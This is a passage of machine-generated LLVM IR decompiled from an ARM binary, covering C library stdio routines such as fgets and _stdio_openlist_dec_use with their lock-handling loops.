  %v1_1825c = load i32, i32* @r7, align 4
  %v2_1825c = add i32 %v1_1825c, 64
  %v3_1825c = inttoptr i32 %v2_1825c to i32*
  store i32 %v0_1825c, i32* %v3_1825c, align 4
  %v0_18260 = load i32, i32* @r7, align 4
  %v1_18260 = add i32 %v0_18260, 56
  store i32 %v1_18260, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %dec_label_pc_18294.dec_label_pc_18264_crit_edge, %dec_label_pc_1825c
  %v0_1826c = phi i32 [ %v0_1826c.pre, %dec_label_pc_18294.dec_label_pc_18264_crit_edge ], [ %v1_18260, %dec_label_pc_1825c ]
  %v0_18264 = phi i32 [ %v0_18264.pre, %dec_label_pc_18294.dec_label_pc_18264_crit_edge ], [ %v0_18260, %dec_label_pc_1825c ]
  %v1_18264 = add i32 %v0_18264, 56
  %v2_18264 = inttoptr i32 %v1_18264 to i32*
  %v3_18264 = load i32, i32* %v2_18264, align 4
  store i32 %v3_18264, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1826c, i32* %r2.global-to-local, align 4
  %v1_1827022 = inttoptr i32 %v0_1826c to i32*
  %v2_1827023 = load i32, i32* %v1_1827022, align 4
  store i32 %v2_1827023, i32* %r3.global-to-local, align 4
  %v3_1827425 = icmp uge i32 %v2_1827023, %v3_18264
  store i1 %v3_1827425, i1* %cpsr_c.global-to-local, align 1
  %v9_1827431 = icmp eq i32 %v2_1827023, %v3_18264
  br i1 %v9_1827431, label %dec_label_pc_1827c, label %dec_label_pc_18294

dec_label_pc_1827c:                               ; preds = %dec_label_pc_18264, %dec_label_pc_1827c.dec_label_pc_18270_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1828c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1828c, label %dec_label_pc_18290, label %dec_label_pc_1827c.dec_label_pc_18270_crit_edge

dec_label_pc_1827c.dec_label_pc_18270_crit_edge:  ; preds = %dec_label_pc_1827c
  %v0_18270.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18274.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18270 = inttoptr i32 %v0_18270.pre to i32*
  %v2_18270 = load i32, i32* %v1_18270, align 4
  store i32 %v2_18270, i32* %r3.global-to-local, align 4
  %v3_18274 = icmp uge i32 %v2_18270, %v1_18274.pre
  store i1 %v3_18274, i1* %cpsr_c.global-to-local, align 1
  %v9_18274 = icmp eq i32 %v2_18270, %v1_18274.pre
  br i1 %v9_18274, label %dec_label_pc_1827c, label %dec_label_pc_18294

dec_label_pc_18290:                               ; preds = %dec_label_pc_1827c
  %v0_18290 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18290, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %dec_label_pc_18264, %dec_label_pc_1827c.dec_label_pc_18270_crit_edge, %dec_label_pc_18290
  %v0_1829c = phi i32 [ %v0_18290, %dec_label_pc_18290 ], [ %v2_1827023, %dec_label_pc_18264 ], [ %v2_18270, %dec_label_pc_1827c.dec_label_pc_18270_crit_edge ]
  %v1_18294 = phi i32 [ %v0_18290, %dec_label_pc_18290 ], [ %v3_18264, %dec_label_pc_18264 ], [ %v1_18274.pre, %dec_label_pc_1827c.dec_label_pc_18270_crit_edge ]
  %v3_18294 = icmp uge i32 %v0_1829c, %v1_18294
  store i1 %v3_18294, i1* %cpsr_c.global-to-local, align 1
  %v9_18294 = icmp eq i32 %v0_1829c, %v1_18294
  br i1 %v9_18294, label %dec_label_pc_1829c, label %dec_label_pc_18294.dec_label_pc_18264_crit_edge

dec_label_pc_18294.dec_label_pc_18264_crit_edge:  ; preds = %dec_label_pc_18294
  %v0_18264.pre = load i32, i32* @r7, align 4
  %v0_1826c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18264

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18294
  %v2_1829c = icmp ne i32 %v1_18294, 0
  store i1 %v2_1829c, i1* %cpsr_c.global-to-local, align 1
  %v7_182a0 = icmp slt i32 %v1_18294, 2
  br i1 %v7_182a0, label %dec_label_pc_182bc, label %dec_label_pc_182a4

dec_label_pc_182a4:                               ; preds = %dec_label_pc_1829c
  %v0_182a8 = load i32, i32* @r1, align 4
  %v1_182a8 = add i32 %v0_182a8, 129
  store i32 %v1_182a8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_182bc

dec_label_pc_182bc:                               ; preds = %.thread, %dec_label_pc_18248, %dec_label_pc_182a4, %dec_label_pc_1829c, %dec_label_pc_181b8
  %v0_182bc = load i32, i32* %r5.global-to-local, align 4
  %v2_182c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_182c4, i32* @r4, align 4
  store i32 %v6_18188, i32* @r5, align 4
  store i32 %v9_18188, i32* @r6, align 4
  store i32 %v12_18188, i32* @r7, align 4
  store i32 %v15_18188, i32* @lr, align 4
  ret i32 %v0_182bc

; uselistorder directives
  uselistorder i32 %v0_18290, { 1, 0, 2 }
  uselistorder i32 %v1_18274.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1822c, { 1, 0, 2 }
  uselistorder i32 %v1_18228, { 0, 2, 1 }
  uselistorder i32 %v1_181e8, { 1, 0 }
  uselistorder i32 %v3_181a0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_182bc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_18294, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1827c, { 1, 0 }
  uselistorder label %dec_label_pc_18248, { 1, 0 }
  uselistorder label %dec_label_pc_18218, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_18208, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_182cc = load i32, i32* @r4, align 4
  store i32 %v3_182cc, i32* %stack_var_-32, align 4
  %v6_182cc = load i32, i32* @r5, align 4
  %v9_182cc = load i32, i32* @r6, align 4
  %v12_182cc = load i32, i32* @r7, align 4
  %v15_182cc = load i32, i32* @r8, align 4
  %v24_182cc = load i32, i32* @lr, align 4
  %v1_182d0 = add i32 %arg3, 52
  %v2_182d0 = inttoptr i32 %v1_182d0 to i32*
  %v3_182d0 = load i32, i32* %v2_182d0, align 4
  store i32 %v3_182d0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_182d4 = icmp eq i32 %v3_182d0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_182d4, label %dec_label_pc_182e8, label %dec_label_pc_1834c

dec_label_pc_182e8:                               ; preds = %entry
  %v0_182e8 = call i32 @__aeabi_read_tp()
  %v1_182ec = add i32 %arg3, 64
  %v2_182ec = inttoptr i32 %v1_182ec to i32*
  %v3_182ec = load i32, i32* %v2_182ec, align 4
  store i32 %v3_182ec, i32* %r3.global-to-local, align 4
  %v1_182f0 = add i32 %v0_182e8, -1168
  store i32 %v1_182f0, i32* @r8, align 4
  %v3_182f4 = icmp uge i32 %v3_182ec, %v1_182f0
  store i1 %v3_182f4, i1* %cpsr_c.global-to-local, align 1
  %v9_182f4 = icmp eq i32 %v3_182ec, %v1_182f0
  br i1 %v9_182f4, label %dec_label_pc_18340, label %dec_label_pc_182fc

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182e8
  %v1_182fc = add i32 %arg3, 56
  store i32 %v1_182fc, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_182fc, i32* %r2.global-to-local, align 4
  %v0_18308 = load i32, i32* @r6, align 4
  store i32 %v0_18308, i32* @r4, align 4
  %v1_1830c36 = inttoptr i32 %v1_182fc to i32*
  %v2_1830c37 = load i32, i32* %v1_1830c36, align 4
  store i32 %v2_1830c37, i32* %r3.global-to-local, align 4
  %v3_1831039 = icmp uge i32 %v2_1830c37, %v0_18308
  store i1 %v3_1831039, i1* %cpsr_c.global-to-local, align 1
  %v9_1831045 = icmp eq i32 %v2_1830c37, %v0_18308
  br i1 %v9_1831045, label %dec_label_pc_18318, label %dec_label_pc_18330

dec_label_pc_18318:                               ; preds = %dec_label_pc_182fc, %dec_label_pc_18318.dec_label_pc_1830c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18328 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18328, label %dec_label_pc_1832c, label %dec_label_pc_18318.dec_label_pc_1830c_crit_edge

dec_label_pc_18318.dec_label_pc_1830c_crit_edge:  ; preds = %dec_label_pc_18318
  %v0_1830c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18310.pre = load i32, i32* @r4, align 4
  %v1_1830c = inttoptr i32 %v0_1830c.pre to i32*
  %v2_1830c = load i32, i32* %v1_1830c, align 4
  store i32 %v2_1830c, i32* %r3.global-to-local, align 4
  %v3_18310 = icmp uge i32 %v2_1830c, %v1_18310.pre
  store i1 %v3_18310, i1* %cpsr_c.global-to-local, align 1
  %v9_18310 = icmp eq i32 %v2_1830c, %v1_18310.pre
  br i1 %v9_18310, label %dec_label_pc_18318, label %dec_label_pc_18330

dec_label_pc_1832c:                               ; preds = %dec_label_pc_18318
  %v0_1832c = load i32, i32* @r4, align 4
  store i32 %v0_1832c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18330

dec_label_pc_18330:                               ; preds = %dec_label_pc_182fc, %dec_label_pc_18318.dec_label_pc_1830c_crit_edge, %dec_label_pc_1832c
  %v0_18330 = phi i32 [ %v0_1832c, %dec_label_pc_1832c ], [ %v2_1830c37, %dec_label_pc_182fc ], [ %v2_1830c, %dec_label_pc_18318.dec_label_pc_1830c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18330 = icmp eq i32 %v0_18330, 0
  br i1 %v2_18330, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_18330
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_18330, %bb
  store i32 99132, i32* @lr, align 4
  %v1_18338 = xor i1 %v2_18330, true
  call void @__pseudo_cond_branch(i1 %v1_18338, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_1833c = load i32, i32* @r8, align 4
  %v1_1833c = load i32, i32* @r7, align 4
  %v2_1833c = add i32 %v1_1833c, 64
  %v3_1833c = inttoptr i32 %v2_1833c to i32*
  store i32 %v0_1833c, i32* %v3_1833c, align 4
  br label %dec_label_pc_18340

dec_label_pc_18340:                               ; preds = %dec_label_pc_182e8, %bb20
  %v0_18340 = load i32, i32* @r7, align 4
  %v1_18340 = add i32 %v0_18340, 60
  %v2_18340 = inttoptr i32 %v1_18340 to i32*
  %v3_18340 = load i32, i32* %v2_18340, align 4
  %v1_18344 = add i32 %v3_18340, 1
  store i32 %v1_18344, i32* %r3.global-to-local, align 4
  store i32 %v1_18344, i32* %v2_18340, align 4
  %v0_1834c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_18350.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_18354.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1834c

dec_label_pc_1834c:                               ; preds = %entry, %dec_label_pc_18340
  %v0_18354 = phi i32 [ %arg3, %entry ], [ %v0_18354.pre, %dec_label_pc_18340 ]
  %v0_18350 = phi i32 [ %arg2, %entry ], [ %v0_18350.pre, %dec_label_pc_18340 ]
  %v0_1834c = phi i32 [ %arg1, %entry ], [ %v0_1834c.pre, %dec_label_pc_18340 ]
  store i32 %v0_18350, i32* %r1.global-to-local, align 4
  store i32 %v0_18354, i32* %r2.global-to-local, align 4
  %v3_18358 = inttoptr i32 %v0_1834c to i8*
  %v4_18358 = call i32 @__GI_fgets_unlocked(i8* %v3_18358, i32 %v0_18350, i32 %v0_18354)
  %v0_1835c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1835c = icmp eq i32 %v0_1835c, 0
  store i32 %v4_18358, i32* %r8.global-to-local, align 4
  br i1 %v2_1835c, label %dec_label_pc_18368, label %dec_label_pc_183dc

dec_label_pc_18368:                               ; preds = %dec_label_pc_1834c
  %v0_18368 = load i32, i32* @r7, align 4
  %v1_18368 = add i32 %v0_18368, 60
  %v2_18368 = inttoptr i32 %v1_18368 to i32*
  %v3_18368 = load i32, i32* %v2_18368, align 4
  %v1_1836c = add i32 %v3_18368, -1
  store i32 %v1_1836c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18370 = icmp eq i32 %v1_1836c, 0
  store i32 %v1_1836c, i32* %v2_18368, align 4
  br i1 %v2_18370, label %dec_label_pc_1837c, label %dec_label_pc_183dc

dec_label_pc_1837c:                               ; preds = %dec_label_pc_18368
  %v0_1837c = load i32, i32* %r3.global-to-local, align 4
  %v1_1837c = load i32, i32* @r7, align 4
  %v2_1837c = add i32 %v1_1837c, 64
  %v3_1837c = inttoptr i32 %v2_1837c to i32*
  store i32 %v0_1837c, i32* %v3_1837c, align 4
  %v0_18380 = load i32, i32* @r7, align 4
  %v1_18380 = add i32 %v0_18380, 56
  store i32 %v1_18380, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18384

dec_label_pc_18384:                               ; preds = %dec_label_pc_183b4.dec_label_pc_18384_crit_edge, %dec_label_pc_1837c
  %v0_1838c = phi i32 [ %v0_1838c.pre, %dec_label_pc_183b4.dec_label_pc_18384_crit_edge ], [ %v1_18380, %dec_label_pc_1837c ]
  %v0_18384 = phi i32 [ %v0_18384.pre, %dec_label_pc_183b4.dec_label_pc_18384_crit_edge ], [ %v0_18380, %dec_label_pc_1837c ]
  %v1_18384 = add i32 %v0_18384, 56
  %v2_18384 = inttoptr i32 %v1_18384 to i32*
  %v3_18384 = load i32, i32* %v2_18384, align 4
  store i32 %v3_18384, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1838c, i32* %r2.global-to-local, align 4
  %v1_1839024 = inttoptr i32 %v0_1838c to i32*
  %v2_1839025 = load i32, i32* %v1_1839024, align 4
  store i32 %v2_1839025, i32* %r3.global-to-local, align 4
  %v3_1839427 = icmp uge i32 %v2_1839025, %v3_18384
  store i1 %v3_1839427, i1* %cpsr_c.global-to-local, align 1
  %v9_1839433 = icmp eq i32 %v2_1839025, %v3_18384
  br i1 %v9_1839433, label %dec_label_pc_1839c, label %dec_label_pc_183b4

dec_label_pc_1839c:                               ; preds = %dec_label_pc_18384, %dec_label_pc_1839c.dec_label_pc_18390_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_183ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_183ac, label %dec_label_pc_183b0, label %dec_label_pc_1839c.dec_label_pc_18390_crit_edge

dec_label_pc_1839c.dec_label_pc_18390_crit_edge:  ; preds = %dec_label_pc_1839c
  %v0_18390.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18394.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18390 = inttoptr i32 %v0_18390.pre to i32*
  %v2_18390 = load i32, i32* %v1_18390, align 4
  store i32 %v2_18390, i32* %r3.global-to-local, align 4
  %v3_18394 = icmp uge i32 %v2_18390, %v1_18394.pre
  store i1 %v3_18394, i1* %cpsr_c.global-to-local, align 1
  %v9_18394 = icmp eq i32 %v2_18390, %v1_18394.pre
  br i1 %v9_18394, label %dec_label_pc_1839c, label %dec_label_pc_183b4

dec_label_pc_183b0:                               ; preds = %dec_label_pc_1839c
  %v0_183b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_183b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_183b4

dec_label_pc_183b4:                               ; preds = %dec_label_pc_18384, %dec_label_pc_1839c.dec_label_pc_18390_crit_edge, %dec_label_pc_183b0
  %v0_183bc = phi i32 [ %v0_183b0, %dec_label_pc_183b0 ], [ %v2_1839025, %dec_label_pc_18384 ], [ %v2_18390, %dec_label_pc_1839c.dec_label_pc_18390_crit_edge ]
  %v1_183b4 = phi i32 [ %v0_183b0, %dec_label_pc_183b0 ], [ %v3_18384, %dec_label_pc_18384 ], [ %v1_18394.pre, %dec_label_pc_1839c.dec_label_pc_18390_crit_edge ]
  %v3_183b4 = icmp uge i32 %v0_183bc, %v1_183b4
  store i1 %v3_183b4, i1* %cpsr_c.global-to-local, align 1
  %v9_183b4 = icmp eq i32 %v0_183bc, %v1_183b4
  br i1 %v9_183b4, label %dec_label_pc_183bc, label %dec_label_pc_183b4.dec_label_pc_18384_crit_edge

dec_label_pc_183b4.dec_label_pc_18384_crit_edge:  ; preds = %dec_label_pc_183b4
  %v0_18384.pre = load i32, i32* @r7, align 4
  %v0_1838c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18384

dec_label_pc_183bc:                               ; preds = %dec_label_pc_183b4
  %v2_183bc = icmp ne i32 %v1_183b4, 0
  store i1 %v2_183bc, i1* %cpsr_c.global-to-local, align 1
  %v7_183c0 = icmp slt i32 %v1_183b4, 2
  br i1 %v7_183c0, label %dec_label_pc_183dc, label %dec_label_pc_183c4

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183bc
  %v0_183c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_183c8 = add i32 %v0_183c8, 129
  store i32 %v1_183c8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_183dc

dec_label_pc_183dc:                               ; preds = %dec_label_pc_18368, %dec_label_pc_1834c, %dec_label_pc_183c4, %dec_label_pc_183bc
  %v0_183dc = load i32, i32* %r8.global-to-local, align 4
  %v2_183e0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_183e0, i32* %r4.global-to-local, align 4
  store i32 %v6_182cc, i32* @r5, align 4
  store i32 %v9_182cc, i32* @r6, align 4
  store i32 %v12_182cc, i32* @r7, align 4
  store i32 %v15_182cc, i32* @r8, align 4
  store i32 %v24_182cc, i32* @lr, align 4
  ret i32 %v0_183dc

; uselistorder directives
  uselistorder i32 %v0_183b0, { 1, 0, 2 }
  uselistorder i32 %v1_18394.pre, { 0, 2, 1 }
  uselistorder i32 %v0_18350, { 1, 0 }
  uselistorder i32 %v0_18354, { 1, 0 }
  uselistorder i32 %v1_18310.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_183dc, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_183b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1839c, { 1, 0 }
  uselistorder label %dec_label_pc_1834c, { 1, 0 }
  uselistorder label %dec_label_pc_18340, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_18330, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18318, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_183e8 = load i32, i32* @r4, align 4
  store i32 %v3_183e8, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r5.global-to-local, align 4
  %v4_183f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 160) to i32*), align 4
  store i32 %v4_183f8, i32* %r7.global-to-local, align 4
  %v0_183fc = call i32 @__aeabi_read_tp()
  store i32 %v0_183fc, i32* %r0.global-to-local, align 4
  %v1_18400 = add i32 %v4_183f8, 8
  %v2_18400 = inttoptr i32 %v1_18400 to i32*
  %v3_18400 = load i32, i32* %v2_18400, align 4
  store i32 %v3_18400, i32* %r3.global-to-local, align 4
  %v1_18404 = add i32 %v0_183fc, -1168
  store i32 %v1_18404, i32* %r6.global-to-local, align 4
  %v3_18408 = icmp uge i32 %v3_18400, %v1_18404
  store i1 %v3_18408, i1* %cpsr_c.global-to-local, align 1
  %v9_18408 = icmp eq i32 %v3_18400, %v1_18404
  br i1 %v9_18408, label %dec_label_pc_18454, label %dec_label_pc_18414

dec_label_pc_18414:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_183f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1842093 = inttoptr i32 %v4_183f8 to i32*
  %v2_1842094 = load i32, i32* %v1_1842093, align 4
  store i32 %v2_1842094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1842496 = icmp eq i32 %v2_1842094, 0
  br i1 %v9_1842496, label %dec_label_pc_1842c, label %dec_label_pc_18444

dec_label_pc_1842c:                               ; preds = %dec_label_pc_18414, %dec_label_pc_1842c.dec_label_pc_18420_crit_edge
  %v0_1842c97 = phi i32 [ %v1_18424.pre, %dec_label_pc_1842c.dec_label_pc_18420_crit_edge ], [ 0, %dec_label_pc_18414 ]
  store i32 %v0_1842c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1843c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1843c, label %dec_label_pc_18440, label %dec_label_pc_1842c.dec_label_pc_18420_crit_edge

dec_label_pc_1842c.dec_label_pc_18420_crit_edge:  ; preds = %dec_label_pc_1842c
  %v0_18420.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18424.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18420 = inttoptr i32 %v0_18420.pre to i32*
  %v2_18420 = load i32, i32* %v1_18420, align 4
  store i32 %v2_18420, i32* %r3.global-to-local, align 4
  %v3_18424 = icmp uge i32 %v2_18420, %v1_18424.pre
  store i1 %v3_18424, i1* %cpsr_c.global-to-local, align 1
  %v9_18424 = icmp eq i32 %v2_18420, %v1_18424.pre
  br i1 %v9_18424, label %dec_label_pc_1842c, label %dec_label_pc_18444

dec_label_pc_18440:                               ; preds = %dec_label_pc_1842c
  %v0_18440 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18440, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_18414, %dec_label_pc_1842c.dec_label_pc_18420_crit_edge, %dec_label_pc_18440
  %v0_18444 = phi i32 [ %v0_18440, %dec_label_pc_18440 ], [ %v2_1842094, %dec_label_pc_18414 ], [ %v2_18420, %dec_label_pc_1842c.dec_label_pc_18420_crit_edge ]
  %v1_18444 = phi i32 [ %v0_18440, %dec_label_pc_18440 ], [ 0, %dec_label_pc_18414 ], [ %v1_18424.pre, %dec_label_pc_1842c.dec_label_pc_18420_crit_edge ]
  %v3_18444 = icmp uge i32 %v0_18444, %v1_18444
  store i1 %v3_18444, i1* %cpsr_c.global-to-local, align 1
  %v9_18444 = icmp eq i32 %v0_18444, %v1_18444
  br i1 %v9_18444, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_18444
  %v1_18448 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_18448, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_18444, %bb
  %v1_1844c = xor i1 %v9_18444, true
  call void @__pseudo_cond_branch(i1 %v1_1844c, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_18450 = load i32, i32* %r6.global-to-local, align 4
  %v1_18450 = load i32, i32* %r7.global-to-local, align 4
  %v2_18450 = add i32 %v1_18450, 8
  %v3_18450 = inttoptr i32 %v2_18450 to i32*
  store i32 %v0_18450, i32* %v3_18450, align 4
  br label %dec_label_pc_18454

dec_label_pc_18454:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_18458 = load i32, i32* %r5.global-to-local, align 4
  %v2_18458 = add i32 %v0_18458, 160
  %v3_18458 = inttoptr i32 %v2_18458 to i32*
  %v4_18458 = load i32, i32* %v3_18458, align 4
  store i32 %v4_18458, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_18460 = add i32 %v0_18458, 12
  %v3_18460 = inttoptr i32 %v2_18460 to i32*
  %v4_18460 = load i32, i32* %v3_18460, align 4
  store i32 %v4_18460, i32* %r3.global-to-local, align 4
  %v1_18464 = inttoptr i32 %v4_18460 to i32*
  %v2_18464 = load i32, i32* %v1_18464, align 4
  store i32 %v2_18464, i32* %r1.global-to-local, align 4
  %v1_18468 = add i32 %v4_18458, 4
  %v2_18468 = inttoptr i32 %v1_18468 to i32*
  %v3_18468 = load i32, i32* %v2_18468, align 4
  %v2_1846c = icmp ne i32 %v2_18464, 0
  store i1 %v2_1846c, i1* %cpsr_c.global-to-local, align 1
  %v7_1846c = icmp eq i32 %v2_18464, 1
  %v1_18470 = add i32 %v3_18468, 1
  store i32 %v1_18470, i32* %r3.global-to-local, align 4
  store i32 %v1_18470, i32* %v2_18468, align 4
  br i1 %v7_1846c, label %dec_label_pc_1847c, label %dec_label_pc_185e0

dec_label_pc_1847c:                               ; preds = %dec_label_pc_18454
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_18480 = load i32, i32* %r5.global-to-local, align 4
  %v2_18480 = add i32 %v0_18480, 80
  %v3_18480 = inttoptr i32 %v2_18480 to i32*
  %v4_18480 = load i32, i32* %v3_18480, align 4
  store i32 %v4_18480, i32* %r3.global-to-local, align 4
  %v1_18484 = inttoptr i32 %v4_18480 to i32*
  %v2_18484 = load i32, i32* %v1_18484, align 4
  store i32 %v2_18484, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_18484, 1
  br i1 %tmp46, label %dec_label_pc_185e0, label %dec_label_pc_18490

dec_label_pc_18490:                               ; preds = %dec_label_pc_1847c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_18494 = add i32 %v0_18480, 152
  %v3_18494 = inttoptr i32 %v2_18494 to i32*
  %v4_18494 = load i32, i32* %v3_18494, align 4
  store i32 %v4_18494, i32* %r7.global-to-local, align 4
  %v1_18498 = add i32 %v4_18494, 8
  %v2_18498 = inttoptr i32 %v1_18498 to i32*
  %v3_18498 = load i32, i32* %v2_18498, align 4
  store i32 %v3_18498, i32* %r3.global-to-local, align 4
  %v1_1849c = load i32, i32* %r6.global-to-local, align 4
  %v3_1849c = icmp uge i32 %v3_18498, %v1_1849c
  store i1 %v3_1849c, i1* %cpsr_c.global-to-local, align 1
  %v9_1849c = icmp eq i32 %v3_18498, %v1_1849c
  br i1 %v9_1849c, label %dec_label_pc_184e0, label %dec_label_pc_184a4

dec_label_pc_184a4:                               ; preds = %dec_label_pc_18490
  store i32 %v4_18494, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_184ac86 = inttoptr i32 %v4_18494 to i32*
  %v2_184ac87 = load i32, i32* %v1_184ac86, align 4
  store i32 %v2_184ac87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_184b089 = icmp eq i32 %v2_184ac87, 0
  br i1 %v9_184b089, label %dec_label_pc_184b8, label %dec_label_pc_184d0

dec_label_pc_184b8:                               ; preds = %dec_label_pc_184a4, %dec_label_pc_184b8.dec_label_pc_184ac_crit_edge
  %v0_184b890 = phi i32 [ %v1_184b0.pre, %dec_label_pc_184b8.dec_label_pc_184ac_crit_edge ], [ 0, %dec_label_pc_184a4 ]
  store i32 %v0_184b890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
